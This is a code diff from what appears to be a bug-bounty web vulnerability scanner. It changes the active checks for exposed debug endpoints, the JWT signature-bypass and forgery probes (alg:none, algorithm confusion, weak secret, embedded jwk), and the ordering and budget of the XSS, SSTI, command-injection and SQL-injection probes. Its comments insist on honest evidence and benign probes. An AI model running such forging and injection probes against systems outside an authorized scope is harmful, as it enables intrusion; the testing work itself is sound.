         if 200 <= status < 300 and signature.search(body) and body != ctrl_body:
+            # What this check captures is always the same thing: the endpoint is SERVED, unauthenticated,
+            # and the catch-all control rules out an app that 200s everything. For the disclosure entries
+            # that IS the impact — the heap dump, the env listing and the log file are the secrets, and
+            # the captured body is the artifact. For the one entry classed `rce`, exposure is a precursor
+            # rather than the act: the class routes it through the RCE impact model (and its 9.8 vector),
+            # so the proof has to say plainly that nothing was executed. Reporting reachability as
+            # demonstrated execution is the exact over-claim the evidence rule exists to prevent, and a
+            # triager who reproduces this sees an exposed management port, not a running command.
+            limitations = ("" if class_hint != "rce" else
+                           f"Proves only that {name} answers unauthenticated at {path}. NOTHING was executed and no "
+                           f"MBean operation was invoked — the RCE classification is the documented reachability of "
+                           f"this endpoint, not a demonstrated code execution. Invoke one concrete, benign operation "
+                           f"(and stay inside the program's rules) before reporting this as proven RCE.")
             proof = _proof(
                 "confirmed", method=f"GET {path}",
                 affected_asset=why,
                 observed_result=f"{name} is served unauthenticated at {path} (HTTP {status}) with its characteristic response",
                 control_result="a non-existent control path did NOT return this content — the endpoint is genuinely exposed, not a catch-all 200",
                 evidence=f"the response carries the unmistakable {name} signature",
+                limitations=limitations,
             )
             ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}",
                   "matched_value": f"{name} exposed at {path}", "read_data": body[:1200]}
+            # Size the CVSS to THIS entry's graded severity. Only for the disclosure-classed entries:
+            # the one `rce`-hinted entry (Jolokia) must keep its class vector, which its limitations
+            # text above is written against.
+            exposure_cvss = None if class_hint == "rce" else _exposure_cvss(severity, f"{name} at {path}")
             return _finding("active.debug-endpoint", f"{name} exposed unauthenticated: {path}",
-                            severity, "disclosure", class_hint, url, proof, ev)
+                            severity, "disclosure", class_hint, url, proof, ev, cvss=exposure_cvss)
     return None
 
 
@@ -2438,7 +2874,7 @@ def verify_active(
     findings: list[dict[str, Any]],
     *,
     scope: str = "",
-    requests_budget: int = 12,
+    requests_budget: int = _DEFAULT_REQUESTS_BUDGET,
     settings: Any = None,
     governor: HostRateGovernor | None = None,
     http: _Http | None = None,
@@ -2503,16 +2939,16 @@ def verify_active(
         landing = None
 
     results: list[dict[str, Any]] = []
-    # A JWT the TARGET ITSELF handed back in the landing response (Set-Cookie / body / header) — reused
-    # by the alg:none check when the operator supplied no JWT credential, so it can test the app's OWN
-    # token for a signature-verification bypass. Extracted from a response already fetched (no request);
-    # the check re-validates the token authenticates before proving anything, so a stray token is a no-op.
+    # Preserve the carrier of a JWT the target served so the weak-secret acceptance gate sends the
+    # baseline, control and forgery on the same transport. Other JWT checks still take the bare value.
+    # Extraction reuses the landing response and costs no request.
     # This runs OUTSIDE the per-check try/except below, so belt-and-suspenders: a malformed landing
     # body (e.g. a crafted token whose header blows the recursion limit) must never abort the pass.
     try:
-        discovered_jwt = _extract_jwt_token(landing)
+        discovered_carrier = _served_token_carrier(landing)
     except Exception:  # noqa: BLE001 - a crafted landing body is a no-op, never a crash
-        discovered_jwt = ""
+        discovered_carrier = None
+    discovered_jwt = discovered_carrier[1] if discovered_carrier is not None else ""
     # Order: header-only first (cheap), then the request-heavier probes. Each check
     # is wrapped so a budget exhaustion stops cleanly without raising.
     # Each check is tagged with the normalized vuln class it confirms, so the reasoning layer's
@@ -2528,9 +2964,17 @@ def verify_active(
         # request budget before they're reached: alg:none fires on the operator's OR the target's own
         # JWT (weak-secret cracks the HMAC key OFFLINE and spends requests only on a hit), and GraphQL
         # introspection only fires on a graphql-shaped path.
-        ("jwt", lambda: _check_jwt_alg_none(http, sanitized, discovered_token=discovered_jwt)),
-        ("jwt", lambda: _check_jwt_alg_confusion(http, sanitized, discovered_token=discovered_jwt)),
-        ("jwt", lambda: _check_jwt_weak_secret(http, sanitized)),
+        ("jwt", lambda: _check_jwt_alg_none(http, sanitized, discovered_token=discovered_jwt,
+                                            discovered_carrier=discovered_carrier)),
+        ("jwt", lambda: _check_jwt_alg_confusion(http, sanitized, discovered_token=discovered_jwt,
+                                                 discovered_carrier=discovered_carrier)),
+        ("jwt", lambda: _check_jwt_weak_secret(http, sanitized, discovered_carrier=discovered_carrier)),
+        # Embedded-key forgery: the token carries the public half of a key we just generated, so a
+        # verifier that trusts the jwk header validates a token we signed. Unlike the jku/x5u probe in
+        # oob_service it needs no collaborator and no hosted key, so it is the one total-forgery check
+        # that fires on a hunt with no out-of-band infrastructure configured at all.
+        ("jwt", lambda: _check_jwt_jwk_embedded(http, sanitized, discovered_token=discovered_jwt,
+                                                discovered_carrier=discovered_carrier)),
         ("graphql", lambda: _check_graphql_introspection(http, sanitized)),
         # Schema disclosure via error field-suggestions — fires even when introspection is disabled,
         # so it catches the leak the introspection check misses. Graphql-path-gated, one benign query.
@@ -2540,12 +2984,25 @@ def verify_active(
         ("host-header", lambda: _check_host_header(http, sanitized)),
         ("xss", lambda: _check_reflected_xss(http, sanitized, discovered_params, priority=xss_params)),
         # Context-aware XSS runs right after the element-content check — catches the JS-string /
-        # attribute breakouts that check structurally can't confirm, spending budget only if it didn't fire.
+        # attribute breakouts that check structurally can't confirm.
         ("xss", lambda: _check_reflected_xss_context(http, sanitized, discovered_params, priority=xss_params)),
         ("ssti", lambda: _check_ssti(http, sanitized, discovered_params)),
-        # OS command injection via benign $(expr) shell substitution — arithmetic only, no real
-        # command runs. Sits next to SSTI (both are safe arithmetic-echo injection probes) and
-        # ahead of the SQLi variants so a CRITICAL RCE gets request-budget priority.
+        # OS command injection via benign $(expr) shell substitution — arithmetic only, no real command
+        # runs. Sits next to SSTI (both are safe arithmetic-echo injection probes) and ahead of the SQLi
+        # variants.
+        #
+        # ORDER IS NO LONGER WHAT DECIDES WHETHER THIS RUNS, and that is the point. Under the old
+        # 12-request ceiling the param-keyed probes ran to exhaustion in sequence, so whichever check
+        # was ordered last fired zero probes — on a parametered URL the landing fetch plus cors /
+        # redirect / host-header and the two XSS passes reached the ceiling before this one was
+        # reached, and the highest-severity class in the suite was never tested. Ordering cannot fix
+        # that; it only chooses which class starves, and an earlier draft of this release moved the
+        # check up and starved reflected XSS instead (the E2E suite caught it immediately). A reserved
+        # first-parameter slot was tried next and was worse: registering the check twice emitted TWO
+        # critical findings for one endpoint when two parameters were injectable, and it silently stole
+        # the two requests the fixed-budget re-verify path needed to reach XSS. The budget is what was
+        # wrong, so the budget is what was fixed — see _DEFAULT_REQUESTS_BUDGET. This check keeps its
+        # tuned position, and a pass that can afford the suite now reaches it.
         ("rce", lambda: _check_rce_command_injection(http, sanitized, discovered_params)),
         ("sqli", lambda: _check_error_sqli(http, sanitized, discovered_params)),
         ("sqli", lambda: _check_bool_sqli(http, sanitized, discovered_params)),
